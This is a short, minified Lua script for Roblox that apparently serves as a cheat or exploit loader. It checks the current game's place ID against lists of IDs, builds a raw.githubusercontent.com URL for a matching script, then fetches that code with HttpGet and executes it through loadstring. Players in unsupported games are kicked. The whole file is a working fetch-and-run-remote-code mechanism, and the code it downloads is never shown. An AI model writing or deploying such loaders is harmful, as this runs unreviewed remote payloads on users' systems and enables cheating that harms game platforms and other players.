local a=game local b=a:GetService("Players") local c=b.LocalPlayer local d=a.PlaceId
local e={} local f="https://raw.githubusercontent.com/realcath/lab/refs/heads/main/src/main/x/y/z/"
local function g(h,i) e[h]=f..i..".lua" end
local function j(k) local l={} for m in k:gmatch("%d+") do l[#l+1]=tonumber(m) end return l end
local n=j("14890802310,74747090658891") local o=j("77747658251236,138368689293913,96767841099256,75159314259063,99684056491472,123955125827131")
local p,q="BizarreLineage","SailorPiece"
for _,r in ipairs(n) do g(r,p) end for _,r in ipairs(o) do g(r,q) end
local s=tostring local t=tonumber local function u(v) return e[t(s(v))] end
local w=u(d)
local function x(y) return loadstring(a:HttpGet(y)) end
local function z(A) if A then x(A)() else if c then c:Kick(("Game is not supported")) end end end
local B=coroutine.wrap(function() z(w) end) B()
